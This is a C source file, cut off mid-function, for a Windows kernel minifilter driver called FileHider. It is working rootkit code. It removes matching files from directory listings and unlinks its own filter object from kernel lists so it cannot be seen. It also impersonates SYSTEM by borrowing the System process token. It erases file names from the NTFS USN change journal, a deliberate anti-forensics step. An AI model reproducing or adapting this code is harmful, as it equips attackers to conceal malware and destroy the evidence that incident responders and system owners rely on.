// FileHider.c
// Minifilter + kernel $J scrub.
// No FSCTL post-op — $J filtering is handled userland in the app.
// The kernel scrub runs as SYSTEM and preserves MFT timestamps.

#define FLT_MGR 1

#include <fltKernel.h>
#include <ntifs.h>
#include <dontuse.h>

#ifndef IRP_MJ_OPERATION_END_OF_QUEUE
#define IRP_MJ_OPERATION_END_OF_QUEUE  0x80
#endif

#pragma prefast(disable:__WARNING_ENCODE_MEMBER_FUNCTION_POINTER, "kernel callback")

// ─── Names / pool ────────────────────────────────────────────
#define FH_POOL_TAG        'dHiF'
#define FH_SCRUB_TAG       'rbSc'
#define FH_DEVICE_NAME     L"\\Device\\FileHider"
#define FH_SYMLINK_NAME    L"\\DosDevices\\FileHider"

// ─── Control IOCTLs (must match C# Ioctl class) ──────────────
#define FH_IOCTL_ADD_RULE         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FH_IOCTL_REMOVE_RULE      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FH_IOCTL_CLEAR_RULES      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x902, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FH_IOCTL_GET_COUNT        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x903, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FH_IOCTL_LIST_RULES       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x904, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FH_IOCTL_GET_STATUS       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x905, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FH_IOCTL_SET_SPOOF        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x906, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FH_IOCTL_GET_SPOOF        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x907, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FH_IOCTL_SET_HIDE_JOURNAL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x908, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FH_IOCTL_GET_HIDE_JOURNAL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x909, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FH_IOCTL_RESET            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x90A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FH_IOCTL_HIDE_NOW         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x90B, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FH_IOCTL_SCRUB_JOURNAL    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x90C, METHOD_BUFFERED, FILE_ANY_ACCESS)

// ─── STATUS_REPLY layout (must match C# STATUS_REPLY) ────────
#define FH_STATUS_MAGIC   0x4F555443u
#define FH_STATUS_VERSION 1

typedef struct _FH_STATUS_REPLY {
    ULONG       Magic;
    ULONG       Version;
    ULONGLONG   SessionId;
    ULONG       FilterAttached;
    ULONG       RuleCount;
    ULONG       LastError;
    ULONG       FsctlHits;
    ULONG       FsctlFiltered;
    ULONG       RecordsSeen;
    ULONG       RecordsRemoved;
    ULONG       ParseFailures;
    ULONG       ReadBlocked;
    ULONG       QuerySpoofed;
    ULONG       FileUsnFiltered;
    ULONG       SpoofEmpty;
    ULONG       HideJournal;
    ULONG       CreateHits;
    ULONG       JournalBlocked;
    ULONG       PreOpSeen;
    ULONG       PostOpSeen;
    ULONG       PostOpNoBuf;
    ULONG       PostOpInfoBad;
    ULONG       ReadPreSeen;
    ULONG       ReadPostSeen;
    ULONG       ReadNoBuf;
    ULONG       ReadInfoBad;
    ULONG       ReadMatched;
    ULONG       ReadNameHits;
    ULONG       CreateNameHits;
    ULONG       CreateUncacheForced;
    ULONG       LastCode;
    ULONG       LastMethod;
    ULONG       LastInfo;
    ULONG       LastOutCap;
    ULONGLONG   LastOutBuf;
    ULONG       LastValidate;
    ULONG       LastRecords;
    ULONG       LastFiltered;
    UCHAR       LastRaw[256];
    WCHAR       FirstName[64];
    ULONG       FirstNameLen;
    ULONG       Reserved;
} FH_STATUS_REPLY, * PFH_STATUS_REPLY;

// ─── RULE_REQUEST layout (must match C# RULE_REQUEST) ────────
#define FH_RULE_STRING_CHARS 260
typedef struct _FH_RULE_REQUEST {
    WCHAR       String[FH_RULE_STRING_CHARS];
    ULONGLONG   Usn;
} FH_RULE_REQUEST, * PFH_RULE_REQUEST;

// ─── rule node ───────────────────────────────────────────────
typedef struct _FH_RULE {
    LIST_ENTRY  ListEntry;
    ULONGLONG   Usn;
    USHORT      NameLength;      // bytes
    WCHAR       Name[1];
} FH_RULE, * PFH_RULE;

// ─── globals ─────────────────────────────────────────────────
static PFLT_FILTER       g_Filter = NULL;
static PDEVICE_OBJECT    g_ControlDevice = NULL;
static LIST_ENTRY        g_RuleList;
static KSPIN_LOCK        g_RuleLock;
static ULONGLONG         g_SessionId = 0;
static ULONG             g_RuleCount = 0;
static BOOLEAN           g_FilterAttached = FALSE;
static BOOLEAN           g_SpoofEmpty = FALSE;
static BOOLEAN           g_HideJournal = FALSE;
static BOOLEAN           g_AlreadyHidden = FALSE;
static FH_STATUS_REPLY   g_Stats;

// ─── prototypes ──────────────────────────────────────────────
DRIVER_INITIALIZE DriverEntry;
NTSTATUS DriverEntry(PDRIVER_OBJECT, PUNICODE_STRING);

NTSTATUS FhInstanceSetup(PCFLT_RELATED_OBJECTS, FLT_INSTANCE_SETUP_FLAGS,
    DEVICE_TYPE, FLT_FILESYSTEM_TYPE);
NTSTATUS FhInstanceQueryTeardown(PCFLT_RELATED_OBJECTS,
    FLT_INSTANCE_QUERY_TEARDOWN_FLAGS);
VOID     FhInstanceTeardownStart(PCFLT_RELATED_OBJECTS,
    FLT_INSTANCE_TEARDOWN_FLAGS);
VOID     FhInstanceTeardownComplete(PCFLT_RELATED_OBJECTS,
    FLT_INSTANCE_TEARDOWN_FLAGS);
NTSTATUS FhUnload(FLT_FILTER_UNLOAD_FLAGS);

FLT_POSTOP_CALLBACK_STATUS FhPostDirCtrl(PFLT_CALLBACK_DATA,
    PCFLT_RELATED_OBJECTS,
    PVOID,
    FLT_POST_OPERATION_FLAGS);

NTSTATUS FhCreateClose(PDEVICE_OBJECT, PIRP);
NTSTATUS FhDeviceControl(PDEVICE_OBJECT, PIRP);
VOID     FhDriverUnload(PDRIVER_OBJECT);

static VOID    FhUnlinkListEntry(ULONG_PTR EntryAddr);
static BOOLEAN FhFindAndUnlinkFilterGlobal(PFLT_FILTER Filter);

static NTSTATUS FhAddRule(PFH_RULE_REQUEST Req);
static NTSTATUS FhRemoveRule(PFH_RULE_REQUEST Req);
static VOID     FhClearRules(VOID);

static BOOLEAN  FhRuleMatchName(PCWSTR Name, USHORT NameBytes);

static BOOLEAN  FhTrimDirBuffer(PVOID Buffer, PULONG Length,
    FILE_INFORMATION_CLASS InfoClass);

static VOID     FhResetStats(VOID);

static NTSTATUS FhImpersonateSystem(VOID);
static VOID     FhRevertSelf(VOID);
static NTSTATUS FhScrubJournal(PULONGLONG Usns, ULONG Count, PULONG PatchedOut);

// ═════════════════════════════════════════════════════════════
//  DKOM
// ═════════════════════════════════════════════════════════════
static VOID
FhUnlinkListEntry(ULONG_PTR EntryAddr)
{
    PULONG_PTR flink = (PULONG_PTR)EntryAddr;
    PULONG_PTR blink = (PULONG_PTR)(EntryAddr + sizeof(ULONG_PTR));
    ULONG_PTR  f = *flink;
    ULONG_PTR  b = *blink;

    *(PULONG_PTR)(f + sizeof(ULONG_PTR)) = b;
    *(PULONG_PTR)(b) = f;

    *flink = EntryAddr;
    *blink = EntryAddr;
}

static BOOLEAN
FhFindAndUnlinkFilterGlobal(PFLT_FILTER Filter)
{
    ULONG_PTR self = (ULONG_PTR)Filter;
    ULONG_PTR entry = 0;
    ULONG     off;

    for (off = 0; off < 0x400; off += sizeof(ULONG_PTR)) {
        ULONG_PTR addr = self + off;

        if (!MmIsAddressValid((PVOID)addr)) break;
        if (!MmIsAddressValid((PVOID)(addr + sizeof(ULONG_PTR)))) break;

        ULONG_PTR f = *(PULONG_PTR)addr;
        ULONG_PTR b = *(PULONG_PTR)(addr + sizeof(ULONG_PTR));

        if (f < 0xFFFF800000000000ULL) continue;
        if (b < 0xFFFF800000000000ULL) continue;
        if (!MmIsAddressValid((PVOID)f)) continue;
        if (!MmIsAddressValid((PVOID)b)) continue;
        if (f == addr && b == addr) continue;

        ULONG_PTR fb = *(PULONG_PTR)(f + sizeof(ULONG_PTR));
        ULONG_PTR bf = *(PULONG_PTR)(b);

        if (fb == addr && bf == addr) { entry = addr; break; }
    }

    if (entry == 0) {
        DbgPrint("[FileHider] hide: no list entry found\n");
        return FALSE;
    }

    FhUnlinkListEntry(entry);
    DbgPrint("[FileHider] hide: unlinked FLT_FILTER entry at %p\n", (PVOID)entry);
    return TRUE;
}

// ═════════════════════════════════════════════════════════════
//  Rule management
// ═════════════════════════════════════════════════════════════
static NTSTATUS
FhAddRule(PFH_RULE_REQUEST Req)
{
    PFH_RULE e;
    SIZE_T   bytes;
    ULONG    len;
    KLOCK_QUEUE_HANDLE qh;
    PLIST_ENTRY l;

    if (!Req) return STATUS_INVALID_PARAMETER;

    len = 0;
    while (len < FH_RULE_STRING_CHARS && Req->String[len]) len++;

    if (Req->Usn == 0 && len == 0) return STATUS_INVALID_PARAMETER;
    if (Req->Usn == 0 && len > 200) return STATUS_INVALID_PARAMETER;

    KeAcquireInStackQueuedSpinLock(&g_RuleLock, &qh);
    for (l = g_RuleList.Flink; l != &g_RuleList; l = l->Flink) {
        PFH_RULE r = CONTAINING_RECORD(l, FH_RULE, ListEntry);
        if (Req->Usn != 0) {
            if (r->Usn == Req->Usn) {
                KeReleaseInStackQueuedSpinLock(&qh);
                return STATUS_OBJECT_NAME_COLLISION;
            }
        }
        else {
            if (r->Usn == 0 &&
                r->NameLength == (USHORT)(len * sizeof(WCHAR)) &&
                RtlEqualMemory(r->Name, Req->String, r->NameLength)) {
                KeReleaseInStackQueuedSpinLock(&qh);
                return STATUS_OBJECT_NAME_COLLISION;
            }
        }
    }
    KeReleaseInStackQueuedSpinLock(&qh);

    bytes = sizeof(FH_RULE) + (len + 1) * sizeof(WCHAR);
    e = (PFH_RULE)ExAllocatePoolWithTag(NonPagedPoolNx, bytes, FH_POOL_TAG);
    if (!e) return STATUS_INSUFFICIENT_RESOURCES;

    RtlZeroMemory(e, bytes);
    e->Usn = Req->Usn;
    if (Req->Usn == 0) {
        e->NameLength = (USHORT)(len * sizeof(WCHAR));
        RtlCopyMemory(e->Name, Req->String, len * sizeof(WCHAR));
    }

    KeAcquireInStackQueuedSpinLock(&g_RuleLock, &qh);
    InsertTailList(&g_RuleList, &e->ListEntry);
    g_RuleCount++;
    KeReleaseInStackQueuedSpinLock(&qh);

    return STATUS_SUCCESS;
}

static NTSTATUS
FhRemoveRule(PFH_RULE_REQUEST Req)
{
    PLIST_ENTRY        l;
    KLOCK_QUEUE_HANDLE qh;
    PFH_RULE           found = NULL;
    ULONG              len = 0;

    if (!Req) return STATUS_INVALID_PARAMETER;

    if (Req->Usn == 0) {
        while (len < FH_RULE_STRING_CHARS && Req->String[len]) len++;
        if (len == 0) return STATUS_INVALID_PARAMETER;
    }

    KeAcquireInStackQueuedSpinLock(&g_RuleLock, &qh);
    for (l = g_RuleList.Flink; l != &g_RuleList; l = l->Flink) {
        PFH_RULE r = CONTAINING_RECORD(l, FH_RULE, ListEntry);
        BOOLEAN match = FALSE;
        if (Req->Usn != 0) {
            if (r->Usn == Req->Usn) match = TRUE;
        }
        else {
            if (r->Usn == 0 &&
                r->NameLength == (USHORT)(len * sizeof(WCHAR)) &&
                RtlEqualMemory(r->Name, Req->String, r->NameLength))
                match = TRUE;
        }
        if (match) {
            RemoveEntryList(&r->ListEntry);
            g_RuleCount--;
            found = r;
            break;
        }
    }
    KeReleaseInStackQueuedSpinLock(&qh);

    if (!found) return STATUS_OBJECT_NAME_NOT_FOUND;
    ExFreePoolWithTag(found, FH_POOL_TAG);
    return STATUS_SUCCESS;
}
static VOID
FhClearRules(VOID)
{
    LIST_ENTRY         local;
    KLOCK_QUEUE_HANDLE qh;
    PLIST_ENTRY        l;

    InitializeListHead(&local);

    KeAcquireInStackQueuedSpinLock(&g_RuleLock, &qh);
    while (!IsListEmpty(&g_RuleList)) {
        l = RemoveHeadList(&g_RuleList);
        InsertTailList(&local, l);
    }
    g_RuleCount = 0;
    KeReleaseInStackQueuedSpinLock(&qh);

    while (!IsListEmpty(&local)) {
        l = RemoveHeadList(&local);
        PFH_RULE r = CONTAINING_RECORD(l, FH_RULE, ListEntry);
        ExFreePoolWithTag(r, FH_POOL_TAG);
    }
}

static BOOLEAN
FhRuleMatchName(PCWSTR Name, USHORT NameBytes)
{
    PLIST_ENTRY        l;
    KLOCK_QUEUE_HANDLE qh;
    BOOLEAN            hit = FALSE;

    if (NameBytes == 0 || Name == NULL) return FALSE;

    KeAcquireInStackQueuedSpinLock(&g_RuleLock, &qh);
    for (l = g_RuleList.Flink; l != &g_RuleList; l = l->Flink) {
        PFH_RULE r = CONTAINING_RECORD(l, FH_RULE, ListEntry);
        if (r->Usn != 0 || r->NameLength == 0) continue;
        if (r->NameLength > NameBytes) continue;

        {
            ULONG outer;
            for (outer = 0; outer + r->NameLength <= NameBytes; outer += sizeof(WCHAR)) {
                if (RtlEqualMemory((PUCHAR)Name + outer, r->Name, r->NameLength)) {
                    hit = TRUE;
                    break;
                }
            }
        }
        if (hit) break;
    }
    KeReleaseInStackQueuedSpinLock(&qh);
    return hit;
}

// ═════════════════════════════════════════════════════════════
//  Directory entry trim
// ═════════════════════════════════════════════════════════════
static ULONG
FhNameLenForClass(PVOID Entry, FILE_INFORMATION_CLASS InfoClass, PWCHAR* NameOut)
{
    PWCHAR name = NULL; ULONG len = 0;
    switch (InfoClass) {
    case FileDirectoryInformation: {
        PFILE_DIRECTORY_INFORMATION e = (PFILE_DIRECTORY_INFORMATION)Entry;
        name = e->FileName; len = e->FileNameLength; break;
    }
    case FileFullDirectoryInformation:
    case FileIdFullDirectoryInformation: {
        PFILE_FULL_DIR_INFORMATION e = (PFILE_FULL_DIR_INFORMATION)Entry;
        name = e->FileName; len = e->FileNameLength; break;
    }
    case FileBothDirectoryInformation: {
        PFILE_BOTH_DIR_INFORMATION e = (PFILE_BOTH_DIR_INFORMATION)Entry;
        name = e->FileName; len = e->FileNameLength; break;
    }
    case FileIdBothDirectoryInformation: {
        PFILE_ID_BOTH_DIR_INFORMATION e = (PFILE_ID_BOTH_DIR_INFORMATION)Entry;
        name = e->FileName; len = e->FileNameLength; break;
    }
    case FileNamesInformation: {
        PFILE_NAMES_INFORMATION e = (PFILE_NAMES_INFORMATION)Entry;
        name = e->FileName; len = e->FileNameLength; break;
    }
    default: break;
    }
    *NameOut = name;
    return len;
}

static BOOLEAN
FhTrimDirBuffer(PVOID Buffer, PULONG Length, FILE_INFORMATION_CLASS InfoClass)
{
    PUCHAR  base = (PUCHAR)Buffer;
    PUCHAR  prev = NULL;
    PUCHAR  curr = base;
    BOOLEAN modified = FALSE;

    while (curr != NULL) {
        ULONG   nextOff = *(ULONG*)curr;
        PWCHAR  name = NULL;
        ULONG   nameLen = FhNameLenForClass(curr, InfoClass, &name);

        if (name == NULL) break;
        if (nameLen == 0) {
            prev = curr;
            if (nextOff == 0) break;
            curr = curr + nextOff;
            continue;
        }

        if (FhRuleMatchName(name, (USHORT)nameLen)) {
            if (prev) {
                if (nextOff == 0) { *(ULONG*)prev = 0; break; }
                *(ULONG*)prev += nextOff;
                curr = prev + *(ULONG*)prev;
            }
            else {
                if (nextOff == 0) { *Length = 0; return TRUE; }
                {
                    ULONG moveBytes = *Length - nextOff;
                    RtlMoveMemory(base, base + nextOff, moveBytes);
                    *Length -= nextOff;
                    curr = base;
                }
            }
            modified = TRUE;
        }
        else {
            prev = curr;
            if (nextOff == 0) break;
            curr = curr + nextOff;
        }
    }
    return modified;
}

FLT_POSTOP_CALLBACK_STATUS
FhPostDirCtrl(PFLT_CALLBACK_DATA Data,
    PCFLT_RELATED_OBJECTS FltObjects,
    PVOID CompletionContext,
    FLT_POST_OPERATION_FLAGS Flags)
{
    PVOID  buf;
    ULONG  len;
    FILE_INFORMATION_CLASS cls;

    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(CompletionContext);

    if (Flags & FLTFL_POST_OPERATION_DRAINING) return FLT_POSTOP_FINISHED_PROCESSING;
    if (Data->Iopb->MinorFunction != IRP_MN_QUERY_DIRECTORY) return FLT_POSTOP_FINISHED_PROCESSING;
    if (!NT_SUCCESS(Data->IoStatus.Status)) return FLT_POSTOP_FINISHED_PROCESSING;

    len = Data->Iopb->Parameters.DirectoryControl.QueryDirectory.Length;
    if (len == 0) return FLT_POSTOP_FINISHED_PROCESSING;

    if (Data->Iopb->Parameters.DirectoryControl.QueryDirectory.MdlAddress)
        buf = MmGetSystemAddressForMdlSafe(
            Data->Iopb->Parameters.DirectoryControl.QueryDirectory.MdlAddress,
            NormalPagePriority);
    else
        buf = Data->Iopb->Parameters.DirectoryControl.QueryDirectory.DirectoryBuffer;

    if (!buf) return FLT_POSTOP_FINISHED_PROCESSING;

    cls = Data->Iopb->Parameters.DirectoryControl.QueryDirectory.FileInformationClass;

    switch (cls) {
    case FileDirectoryInformation:
    case FileFullDirectoryInformation:
    case FileBothDirectoryInformation:
    case FileIdBothDirectoryInformation:
    case FileIdFullDirectoryInformation:
    case FileNamesInformation: {
        ULONG newLen = len;
        if (FhTrimDirBuffer(buf, &newLen, cls)) {
            Data->IoStatus.Information = newLen;
            if (newLen == 0) Data->IoStatus.Status = STATUS_NO_MORE_FILES;
        }
        break;
    }
    default: break;
    }

    return FLT_POSTOP_FINISHED_PROCESSING;
}

// ═════════════════════════════════════════════════════════════
//  Stats helpers
// ═════════════════════════════════════════════════════════════
static VOID
FhResetStats(VOID)
{
    ULONG mine = g_Stats.Magic;
    ULONG ver = g_Stats.Version;
    ULONGLONG sid = g_Stats.SessionId;
    RtlZeroMemory(&g_Stats, sizeof(g_Stats));
    g_Stats.Magic = mine;
    g_Stats.Version = ver;
    g_Stats.SessionId = sid;
}

// ═════════════════════════════════════════════════════════════
//  Kernel $J scrub — impersonate SYSTEM, open backup-intent,
//  read whole $J, zero matching FileName fields, write back.
// ═════════════════════════════════════════════════════════════
typedef struct _FH_USN_REC {
    ULONG         RecordLength;
    USHORT        MajorVersion;
    USHORT        MinorVersion;
    ULONGLONG     FileReferenceNumber;
    ULONGLONG     ParentFileReferenceNumber;
    LONGLONG      Usn;
    LARGE_INTEGER TimeStamp;
    ULONG         Reason;
    ULONG         SourceInfo;
    ULONG         SecurityId;
    ULONG         FileAttributes;
    USHORT        FileNameLength;
    USHORT        FileNameOffset;
} FH_USN_REC, * PFH_USN_REC;

static NTSTATUS
FhImpersonateSystem(VOID)
{
    PEPROCESS     sysProc = NULL;
    PACCESS_TOKEN sysToken = NULL;
    NTSTATUS      st;

    st = PsLookupProcessByProcessId((HANDLE)4, &sysProc);
    if (!NT_SUCCESS(st)) return st;

    sysToken = PsReferencePrimaryToken(sysProc);
    if (!sysToken) { ObDereferenceObject(sysProc); return STATUS_UNSUCCESSFUL; }

    st = PsImpersonateClient(PsGetCurrentThread(), sysToken,
        TRUE, TRUE, SecurityImpersonation);

    PsDereferencePrimaryToken(sysToken);
    ObDereferenceObject(sysProc);
    return st;
}

static VOID
FhRevertSelf(VOID)
{
    PsRevertToSelf();
}

static NTSTATUS
FhScrubJournal(PULONGLONG Usns, ULONG Count, PULONG PatchedOut)
{
    NTSTATUS           status;
    HANDLE             hFile = NULL;
    OBJECT_ATTRIBUTES  oa;
    IO_STATUS_BLOCK    iosb;
    UNICODE_STRING     path;
    PVOID              buffer = NULL;
    FILE_STANDARD_INFORMATION fsi;
    SIZE_T             total;
    ULONG              patched = 0, i;
    SIZE_T             off;
    BOOLEAN            impersonated = FALSE;

    *PatchedOut = 0;

    RtlInitUnicodeString(&path, L"\\??\\C:\\$Extend\\$UsnJrnl:$J");
    InitializeObjectAttributes(&oa, &path,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    if (NT_SUCCESS(FhImpersonateSystem()))
        impersonated = TRUE;

    status = ZwCreateFile(&hFile,
        FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
        &oa, &iosb, NULL,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_OPEN_FOR_BACKUP_INTENT | FILE_NON_DIRECTORY_FILE,
        NULL, 0);

    if (impersonated) FhRevertSelf();

    if (!NT_SUCCESS(status)) {
        DbgPrint("[FileHider] scrub: ZwCreateFile $J fail 0x%X\n", status);
        return status;
    }

    RtlZeroMemory(&fsi, sizeof(fsi));
    status = ZwQueryInformationFile(hFile, &iosb, &fsi, sizeof(fsi), FileStandardInformation);
    if (!NT_SUCCESS(status)) { ZwClose(hFile); return status; }

    if (fsi.EndOfFile.QuadPart <= 0 || fsi.EndOfFile.QuadPart > 0x40000000) {
        ZwClose(hFile);
        return STATUS_INVALID_BUFFER_SIZE;
    }

    total = (SIZE_T)fsi.EndOfFile.QuadPart;
    buffer = ExAllocatePoolWithTag(NonPagedPoolNx, total, FH_SCRUB_TAG);
    if (!buffer) { ZwClose(hFile); return STATUS_INSUFFICIENT_RESOURCES; }

    {
        LARGE_INTEGER zero;
        zero.QuadPart = 0;
        status = ZwReadFile(hFile, NULL, NULL, NULL, &iosb, buffer,
            (ULONG)total, &zero, NULL);
    }
    if (!NT_SUCCESS(status)) goto done;

    off = 0;
    while (off + sizeof(FH_USN_REC) <= total) {
        PFH_USN_REC rec = (PFH_USN_REC)((PUCHAR)buffer + off);

        if (rec->RecordLength < sizeof(FH_USN_REC)) break;
        if (rec->RecordLength > 0x10000) break;
        if (off + rec->RecordLength > total) break;
        if (rec->MajorVersion != 2 && rec->MajorVersion != 3) break;

        for (i = 0; i < Count; i++) {
            if ((ULONGLONG)rec->Usn == Usns[i]) {
                if (rec->FileNameLength > 0 &&
                    (ULONG)rec->FileNameOffset + rec->FileNameLength <= rec->RecordLength) {
                    RtlZeroMemory((PUCHAR)rec + rec->FileNameOffset, rec->FileNameLength);
                    rec->FileNameLength = 0;
                    patched++;
                }
                break;
            }
        }

        off += rec->RecordLength;
        off = (off + 7) & ~(SIZE_T)7;
    }

    if (patched > 0) {
        LARGE_INTEGER zero;
        zero.QuadPart = 0;
        status = ZwWriteFile(hFile, NULL, NULL, NULL, &iosb, buffer,
            (ULONG)total, &zero, NULL);
        if (NT_SUCCESS(status)) {
            *PatchedOut = patched;
            DbgPrint("[FileHider] scrub: patched %u records\n", patched);
        }
    }
    else {
        status = STATUS_SUCCESS;
    }

done:
    if (buffer) ExFreePoolWithTag(buffer, FH_SCRUB_TAG);
    ZwClose(hFile);
    return status;
}

// ═════════════════════════════════════════════════════════════
//  Instance callbacks
// ═════════════════════════════════════════════════════════════
NTSTATUS
FhInstanceSetup(PCFLT_RELATED_OBJECTS FltObjects,
    FLT_INSTANCE_SETUP_FLAGS Flags,
    DEVICE_TYPE VolumeDeviceType,
    FLT_FILESYSTEM_TYPE VolumeFilesystemType)
{
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(Flags);
    UNREFERENCED_PARAMETER(VolumeDeviceType);
    UNREFERENCED_PARAMETER(VolumeFilesystemType);
    return STATUS_SUCCESS;
}

NTSTATUS FhInstanceQueryTeardown(PCFLT_RELATED_OBJECTS F, FLT_INSTANCE_QUERY_TEARDOWN_FLAGS Fl)
{
    UNREFERENCED_PARAMETER(F); UNREFERENCED_PARAMETER(Fl); return STATUS_SUCCESS;
}
VOID FhInstanceTeardownStart(PCFLT_RELATED_OBJECTS F, FLT_INSTANCE_TEARDOWN_FLAGS Fl)
{
    UNREFERENCED_PARAMETER(F); UNREFERENCED_PARAMETER(Fl);
}
VOID FhInstanceTeardownComplete(PCFLT_RELATED_OBJECTS F, FLT_INSTANCE_TEARDOWN_FLAGS Fl)
{
    UNREFERENCED_PARAMETER(F); UNREFERENCED_PARAMETER(Fl);
}

NTSTATUS
FhUnload(FLT_FILTER_UNLOAD_FLAGS Flags)
{
    UNREFERENCED_PARAMETER(Flags);
    DbgPrint("[FileHider] FhUnload\n");
    FhClearRules();
    return STATUS_SUCCESS;
}

// ═════════════════════════════════════════════════════════════
//  Registration
// ═════════════════════════════════════════════════════════════
CONST FLT_OPERATION_REGISTRATION FhCallbacks[] = {
    { IRP_MJ_DIRECTORY_CONTROL, 0, NULL, FhPostDirCtrl },
    { IRP_MJ_OPERATION_END_OF_QUEUE },
};

CONST FLT_REGISTRATION FhFilterRegistration = {
    sizeof(FLT_REGISTRATION),
    FLT_REGISTRATION_VERSION,
    0,
    NULL,
    FhCallbacks,
    FhUnload,
    FhInstanceSetup,
    FhInstanceQueryTeardown,
    FhInstanceTeardownStart,
    FhInstanceTeardownComplete,
    NULL, NULL, NULL, NULL, NULL, NULL
};

// ═════════════════════════════════════════════════════════════
//  Control device
// ═════════════════════════════════════════════════════════════
NTSTATUS
FhCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS
FhDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    PIO_STACK_LOCATION sp;
    NTSTATUS           status = STATUS_INVALID_DEVICE_REQUEST;
    ULONG              code, inLen, outLen;
    PVOID              buffer;

    UNREFERENCED_PARAMETER(DeviceObject);

    sp = IoGetCurrentIrpStackLocation(Irp);
    code = sp->Parameters.DeviceIoControl.IoControlCode;
    inLen = sp->Parameters.DeviceIoControl.InputBufferLength;
    outLen = sp->Parameters.DeviceIoControl.OutputBufferLength;
    buffer = Irp->AssociatedIrp.SystemBuffer;

    Irp->IoStatus.Information = 0;

    switch (code) {

    case FH_IOCTL_ADD_RULE:
        if (!buffer || inLen < sizeof(FH_RULE_REQUEST)) { status = STATUS_INVALID_PARAMETER; break; }
        status = FhAddRule((PFH_RULE_REQUEST)buffer);
        break;

    case FH_IOCTL_REMOVE_RULE:
        if (!buffer || inLen < sizeof(FH_RULE_REQUEST)) { status = STATUS_INVALID_PARAMETER; break; }
        status = FhRemoveRule((PFH_RULE_REQUEST)buffer);
        break;

    case FH_IOCTL_CLEAR_RULES:
        FhClearRules();
        status = STATUS_SUCCESS;
        break;

    case FH_IOCTL_GET_COUNT:
        if (!buffer || outLen < sizeof(ULONG)) { status = STATUS_INVALID_PARAMETER; break; }
        *(PULONG)buffer = g_RuleCount;
        Irp->IoStatus.Information = sizeof(ULONG);
        status = STATUS_SUCCESS;
        break;

    case FH_IOCTL_LIST_RULES:
    {
        PLIST_ENTRY l;
        KLOCK_QUEUE_HANDLE qh;
        ULONG written = 0;
        ULONG cap = outLen / sizeof(FH_RULE_REQUEST);

        if (!buffer || cap == 0) { status = STATUS_INVALID_PARAMETER; break; }

        KeAcquireInStackQueuedSpinLock(&g_RuleLock, &qh);
        for (l = g_RuleList.Flink; l != &g_RuleList && written < cap; l = l->Flink) {
            PFH_RULE r = CONTAINING_RECORD(l, FH_RULE, ListEntry);
            PFH_RULE_REQUEST rr = (PFH_RULE_REQUEST)((PUCHAR)buffer + written * sizeof(FH_RULE_REQUEST));
            RtlZeroMemory(rr, sizeof(FH_RULE_REQUEST));
            rr->Usn = r->Usn;
            if (r->Usn == 0 && r->NameLength > 0) {
                ULONG chars = r->NameLength / sizeof(WCHAR);
                if (chars > FH_RULE_STRING_CHARS - 1) chars = FH_RULE_STRING_CHARS - 1;
                RtlCopyMemory(rr->String, r->Name, chars * sizeof(WCHAR));
            }
            written++;
        }
        KeReleaseInStackQueuedSpinLock(&qh);

        Irp->IoStatus.Information = written * sizeof(FH_RULE_REQUEST);
        status = STATUS_SUCCESS;
        break;
    }

    case FH_IOCTL_GET_STATUS:
    {
        FH_STATUS_REPLY copy;
        if (!buffer || outLen < sizeof(FH_STATUS_REPLY)) { status = STATUS_INVALID_PARAMETER; break; }

        copy = g_Stats;
        copy.Magic = FH_STATUS_MAGIC;
        copy.Version = FH_STATUS_VERSION;
        copy.SessionId = g_SessionId;
        copy.FilterAttached = g_FilterAttached ? 1 : 0;
        copy.RuleCount = g_RuleCount;
        copy.SpoofEmpty = g_SpoofEmpty ? 1 : 0;
        copy.HideJournal = g_HideJournal ? 1 : 0;

        RtlCopyMemory(buffer, &copy, sizeof(FH_STATUS_REPLY));
        Irp->IoStatus.Information = sizeof(FH_STATUS_REPLY);
        status = STATUS_SUCCESS;
        break;
    }

    case FH_IOCTL_SET_SPOOF:
        if (!buffer || inLen < sizeof(ULONG)) { status = STATUS_INVALID_PARAMETER; break; }
        g_SpoofEmpty = (*(PULONG)buffer) ? TRUE : FALSE;
        status = STATUS_SUCCESS;
        break;

    case FH_IOCTL_GET_SPOOF:
        if (!buffer || outLen < sizeof(ULONG)) { status = STATUS_INVALID_PARAMETER; break; }
        *(PULONG)buffer = g_SpoofEmpty ? 1 : 0;
        Irp->IoStatus.Information = sizeof(ULONG);
        status = STATUS_SUCCESS;
        break;

    case FH_IOCTL_SET_HIDE_JOURNAL:
